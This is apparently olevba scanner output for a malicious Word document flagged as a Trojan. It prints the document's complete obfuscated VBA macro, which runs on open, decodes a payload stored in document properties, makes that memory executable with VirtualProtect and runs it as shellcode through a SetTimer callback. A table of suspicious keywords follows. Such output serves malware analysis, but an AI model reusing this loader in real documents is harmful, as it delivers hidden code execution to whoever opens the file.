olevba 0.60.1 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: HEUR-Trojan.MSOffice.Shelod.gen-58ed28c802684740fe81a63ca9a1b94e5010a52f311670b7bed4cd8cb2dbd3d3
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: HEUR-Trojan.MSOffice.Shelod.gen-58ed28c802684740fe81a63ca9a1b94e5010a52f311670b7bed4cd8cb2dbd3d3 - OLE stream: 'VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
#If VBA7 Then
Private Declare PtrSafe Function DodecylUnvaletudinary Lib "user32" Alias "SetTimer" (ByVal StereotelescopePikakeConcealedly As LongPtr, ByVal TipsiestRamshorns As LongPtr, ByVal HeterocliticalSemimoderately As LongPtr, ByVal TeleostomousMetatantalic As LongPtr) As LongPtr
Private Declare PtrSafe Function PocketersAuthenticRiverbush Lib "user32" Alias "KillTimer" (ByVal SubtilizationSurrounded As LongPtr, ByVal OutwittalNonfundamentallyConnectible As LongPtr) As LongPtr
Private Declare PtrSafe Function PervertedlySecretory Lib "kernel32" Alias "VirtualProtect" (ByVal UmbrageousnessBechicNondilation As LongPtr, ByVal MuralistMamsellRegrowing As LongPtr, ByVal OutsatisfyDissuasory As LongPtr, AlureWeeting As LongPtr) As LongPtr
#Else
Private Declare Function DodecylUnvaletudinary Lib "user32" Alias "SetTimer" ( ByVal CuspidesUnhomeliness As Long, ByVal SexternBanderolesPseudograsserie As Long, ByVal BronzeForecooler As Long, ByVal WastierRetradeArtamidae As Any) As Long
Private Declare Function PocketersAuthenticRiverbush Lib "user32" Alias "KillTimer" ( ByVal CountermarriageNonpliantPopode As Long, ByVal BiliniteAptyalismSyntypic As Long) As Long
Private Declare Function PervertedlySecretory Lib "kernel32" Alias "VirtualProtect"  (ByVal UndertruckPalaceAtharvan As Long, ByVal ChickenheartedExtraentericAurorae As Long, ByVal FarinhaMygaleBoron As Long, UnwelcomingHyphomycetalesMonoglyceride As Long) As Long
#End If
Private Sub Document_Open()
Dim MadreporiteLogisticMalati() As Byte
#If Win64 Then
MadreporiteLogisticMalati = ConfectingIncompactness(ActiveDocument.BuiltInDocumentProperties(mfBdoThzrA("JCRmzpugvbtb")).Value)
#Else
MadreporiteLogisticMalati = ConfectingIncompactness(ActiveDocument.BuiltInDocumentProperties(mfBdoThzrA("FzPzv6Ge6")).Value)
#End If
#If VBA7 Then
Dim ColonelsDragonfish As LongPtr
Dim DampenerUnembayedWrangle As LongPtr
Dim shellCode As LongPtr
Dim EquivocatesAntimonsoon As LongPtr
#Else
Dim ColonelsDragonfish As Long
Dim DampenerUnembayedWrangle As Long
Dim shellCode As Long
Dim EquivocatesAntimonsoon As Long
#End If
DampenerUnembayedWrangle = UBound(MadreporiteLogisticMalati) + 1
shellCode = VarPtr(MadreporiteLogisticMalati(0))
PervertedlySecretory shellCode, DampenerUnembayedWrangle, 64, VarPtr(ColonelsDragonfish)
GetObject(mfBdoThzrA("gO15kvLCHba")).Environment(mfBdoThzrA("WLyRztrxM9c"))(mfBdoThzrA("QGMhNcHGV")) = ActiveDocument.FullName
GetObject(mfBdoThzrA("enGphzitN")).Environment(mfBdoThzrA("aATsrOUqt"))(mfBdoThzrA("ZRi_b5RL_")) = mfBdoThzrA("H1h4F9lEaq")
EquivocatesAntimonsoon = DodecylUnvaletudinary(0, shellCode, 1, shellCode)
HydrocorisanDemethylate 1
PocketersAuthenticRiverbush 0, EquivocatesAntimonsoon
GetObject(mfBdoThzrA("g5T6WLEV")).Environment(mfBdoThzrA("diRBPk")).Remove (mfBdoThzrA("KEEYJjYP7"))
GetObject(mfBdoThzrA("DZXXBaSF")).Environment(mfBdoThzrA("BiTdOZ2D")).Remove (mfBdoThzrA("XzQLvvp0"))
ReDim MadreporiteLogisticMalati(1)
End Sub
Sub HydrocorisanDemethylate(Finish)
Dim ConvincesLiparidAcrita As Long
Dim CladodontidPreconcentratedly As Long
CladodontidPreconcentratedly = Timer() + (Finish)
Do
ConvincesLiparidAcrita = Timer()
DoEvents
Loop Until ConvincesLiparidAcrita > CladodontidPreconcentratedly
End Sub
Public Function mfBdoThzrA(strInput)
mfBdoThzrA = StrReverse(ActiveDocument.CustomDocumentProperties(strInput))
End Function
Function HypsipyleStarshakeBowsman(ParatrachealFriedelite, DesmectasiaAberdonian)
HypsipyleStarshakeBowsman = Mid(ParatrachealFriedelite, DesmectasiaAberdonian + 1, 1)
End Function
Function SnafuLemmon(NonsellingProvokingAmylate) As Long
If Int(Rnd(23)) > 2 Then
SnafuLemmon = 9000
Else
SnafuLemmon = Len(NonsellingProvokingAmylate)
End If
End Function
Function ConfectingIncompactness(UnfactiouslyIrrestrainable)
ReDim CinclidesLullabyingGratton(SnafuLemmon(UnfactiouslyIrrestrainable) - 1) As Byte
Dim HeavenSapiensEndoscopes As Long, SepultSpermatogonium As Long
Dim ThirstleHewhallJarovization: ThirstleHewhallJarovization = mfBdoThzrA("nOzEYD9YRrNM") & mfBdoThzrA("aGMIOwXeOEj")
For HeavenSapiensEndoscopes = 0 To SnafuLemmon(UnfactiouslyIrrestrainable) - 1 Step 2
SepultSpermatogonium = HeavenSapiensEndoscopes / 2
CinclidesLullabyingGratton(SepultSpermatogonium) = CDec(ThirstleHewhallJarovization & HypsipyleStarshakeBowsman(UnfactiouslyIrrestrainable, HeavenSapiensEndoscopes) & HypsipyleStarshakeBowsman(UnfactiouslyIrrestrainable, HeavenSapiensEndoscopes + 1))
Next
ConfectingIncompactness = CinclidesLullabyingGratton
End Function
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Environment         |May read system environment variables        |
|Suspicious|GetObject           |May get an OLE object with a running instance|
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|VirtualProtect      |May inject code into another process         |
|Suspicious|SetTimer            |May run a shellcode in memory                |
|Suspicious|StrReverse          |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

